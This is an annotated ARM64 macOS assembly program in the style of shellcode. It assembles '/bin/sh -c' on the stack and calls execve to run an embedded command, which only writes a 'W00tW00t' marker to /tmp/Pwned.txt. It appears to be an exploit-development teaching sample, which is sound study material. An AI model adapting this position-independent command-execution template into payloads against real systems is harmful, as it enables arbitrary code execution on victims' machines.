.global _main
.align 2

_main:
	sub sp, sp, #48         ; make space on the stack: 2 string slots + 4 array slots (48 keeps SP 16-byte aligned)
	movz x9, #0x622f        ; build "/bin/sh\0" chunk by chunk: '/b'
	movk x9, #0x6e69, lsl #16 ; 'i','n' -> "/bin"
	movk x9, #0x732f, lsl #32 ; '/','s' -> "/bin/s"
	movk x9, #0x0068, lsl #48 ; 'h' + terminator -> "/bin/sh\0"
	stur x9, [sp]           ; store the "/bin/sh\0" string at [sp]
	movz x10, #0x632d       ; build "-c\0": '-','c' chunk, upper zeros = terminator
	stur x10, [sp, #8]      ; store the "-c\0" string at [sp, #8]
	adr x11, cmd            ; classic position-independent trick: load the PC-relative address of our command string
	mov x3, sp              ; x3 = ADDRESS of the "/bin/sh\0" string
	add x4, sp, #8          ; x4 = ADDRESS of the "-c\0" string
	str x3, [sp, #16]       ; argv[0] -> pointer to "/bin/sh\0"
	str x4, [sp, #24]       ; argv[1] -> pointer to "-c\0"
	str x11, [sp, #32]      ; argv[2] -> pointer to our command string
	str xzr, [sp, #40]      ; argv[3] -> NULL terminator (the array must end with NULL)
	mov x0, sp              ; fname argument -> pointer to "/bin/sh\0"
	add x1, sp, #16         ; argp argument -> pointer to our argv array
	mov x2, xzr             ; envp argument -> NULL (XZR always reads as zero)
	movz x16, #0x3b         ; the execve syscall number 59 (0x3B in hex)
	movk x16, #0x200, lsl #16 ; OR with the BSD syscall class 2
	svc #0x80               ; invoke/execute the syscall

	movz x16, #1            ; exit syscall number
	movk x16, #0x200, lsl #16 ; OR with the BSD syscall class 2
	mov x0, #0              ; arg int rval
	svc #0x80               ; invoke/execute the syscall

cmd:
	.string "echo \"W00tW00t\" > /tmp/Pwned.txt"
